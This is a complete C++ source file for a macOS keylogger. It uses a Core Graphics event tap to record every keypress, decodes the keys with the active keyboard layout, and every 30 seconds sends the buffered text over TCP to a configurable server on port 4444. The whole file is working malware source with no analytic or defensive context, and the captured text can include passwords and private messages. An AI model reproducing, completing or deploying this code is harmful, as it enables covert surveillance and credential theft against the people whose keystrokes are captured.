#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <string>
#include <thread>
#include <chrono>

// ===== CONFIGURATION =====
const char* SERVER_IP = "127.0.0.1";   // Change to YOUR Mac's IP
const int   SERVER_PORT = 4444;
const int   FLUSH_INTERVAL_SEC = 30;
// =========================

std::string g_keyBuffer;

// Convert a CGKeyCode to a readable character using the current keyboard layout
std::string KeyCodeToString(CGKeyCode keyCode, CGEventFlags flags) {
    UniChar buf[4];
    UniCharCount actualLen = 0;

    TISInputSourceRef inputSource = TISCopyCurrentKeyboardLayoutInputSource();
    CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(
        inputSource, kTISPropertyUnicodeKeyLayoutData);

    if (!layoutData) return "";

    const UCKeyboardLayout* keyboardLayout =
        (const UCKeyboardLayout*)CFDataGetBytePtr(layoutData);

    UInt32 deadKeyState = 0;
    UInt32 modifierKeyState = 0;

    if (flags & kCGEventFlagMaskShift)    modifierKeyState |= shiftKey;
    if (flags & kCGEventFlagMaskControl)  modifierKeyState |= controlKey;
    if (flags & kCGEventFlagMaskAlternate) modifierKeyState |= optionKey;

    OSStatus status = UCKeyTranslate(
        keyboardLayout,
        keyCode,
        kUCKeyActionDown,
        modifierKeyState,
        LMGetKbdType(),
        0,
        &deadKeyState,
        4,
        &actualLen,
        buf
    );

    if (status == noErr && actualLen > 0) {
        return std::string(buf, buf + actualLen);
    }

    // Special keys that don't produce unicode characters
    switch (keyCode) {
        case kVK_Return:        return "\n";
        case kVK_Tab:           return "\t";
        case kVK_Space:         return " ";
        case kVK_Delete:        return "[BS]";
        case kVK_ForwardDelete: return "[DEL]";
        case kVK_Escape:        return "[ESC]";
        case kVK_Shift:         return "[SHIFT]";
        case kVK_RightShift:    return "[RSHIFT]";
        case kVK_Control:       return "[CTRL]";
        case kVK_RightControl:  return "[RCTRL]";
        case kVK_Option:        return "[OPT]";
        case kVK_RightOption:   return "[ROPT]";
        case kVK_Command:       return "[CMD]";
        case kVK_RightCommand:  return "[RCMD]";
        case kVK_CapsLock:      return "[CAPS]";
        case kVK_LeftArrow:     return "[LEFT]";
        case kVK_RightArrow:    return "[RIGHT]";
        case kVK_UpArrow:       return "[UP]";
        case kVK_DownArrow:     return "[DOWN]";
        case kVK_Home:          return "[HOME]";
        case kVK_End:           return "[END]";
        case kVK_PageUp:        return "[PGUP]";
        case kVK_PageDown:      return "[PGDN]";
        default:
            if (keyCode >= kVK_F1 && keyCode <= kVK_F16) {
                return "[F" + std::to_string(keyCode - kVK_F1 + 1) + "]";
            }
            return "";
    }
}

// Send the buffered keystrokes to the server
void SendBufferToServer(const std::string& data) {
    if (data.empty()) return;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) <= 0) {
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(sock);
        return;
    }

    send(sock, data.c_str(), data.length(), 0);
    close(sock);
}

// Background flush thread
void BufferFlushThread() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(FLUSH_INTERVAL_SEC));
        if (!g_keyBuffer.empty()) {
            std::string toSend;
            toSend.swap(g_keyBuffer);
            SendBufferToServer(toSend);
        }
    }
}

// Event tap callback — fires on every keypress
CGEventRef KeyEventCallback(CGEventTapProxy proxy, CGEventType type,
                             CGEventRef event, void* refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode);
        CGEventFlags flags = CGEventGetFlags(event);

        std::string keyStr = KeyCodeToString(keyCode, flags);
        if (!keyStr.empty()) {
            g_keyBuffer += keyStr;
        }
    }
    return event;
}

int main() {
    // Start the flush thread
    std::thread flushThread(BufferFlushThread);
    flushThread.detach();

    // Create the event tap (listen-only, doesn't block or modify events)
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);

    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionListenOnly,
        eventMask,
        KeyEventCallback,
        NULL
    );

    if (!eventTap) {
        fprintf(stderr, "[!] Failed to create event tap.\n");
        fprintf(stderr, "[!] Grant accessibility permission:\n");
        fprintf(stderr, "    System Preferences > Security & Privacy > Privacy > Accessibility\n");
        return 1;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault, eventTap, 0);

    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    printf("[*] Keylogger running... Press Ctrl+C to stop.\n");
    CFRunLoopRun();

    CFRelease(eventTap);
    CFRelease(runLoopSource);
    return 0;
}